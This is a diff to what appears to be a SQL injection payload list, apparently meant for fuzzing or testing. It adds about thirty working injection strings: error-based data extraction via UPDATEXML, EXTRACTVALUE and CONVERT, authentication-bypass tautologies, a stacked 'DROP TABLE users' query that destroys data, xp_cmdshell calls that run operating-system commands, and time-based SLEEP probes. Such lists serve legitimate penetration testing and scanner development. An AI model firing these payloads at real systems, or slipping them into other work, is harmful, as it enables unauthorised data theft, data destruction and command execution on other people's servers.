@@ -5,9 +5,34 @@
 ' OR '1'='1
 ' OR 1=1--
 ' OR 1=1#
-1' ORDER BY 1--
-1' ORDER BY 2--
-1' ORDER BY 3--
 ' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
 ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
 1 AND EXP(~(SELECT * FROM (SELECT USER()) x))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION())),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
+';--
+'';--
+' OR 1=1;--
+1'; DROP TABLE users;--
+' HAVING 1=1--
+' GROUP BY 1--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CONVERT(int,(SELECT @@version))--
+EXEC xp_cmdshell('dir')--
+'; EXEC xp_cmdshell('whoami')--
+' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--
+' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)--
+1 OR 1=1
+1' OR '1'='1
+"OR"1"="1
+') OR ('1'='1
+')) OR (('1'='1
+' OR 'x'='x
+1;SELECT SLEEP(0)--
+' AND 1=1--
+' AND 1=2--
+' OR 'unusual'='unusual
+' OR ''='
+\
+;;
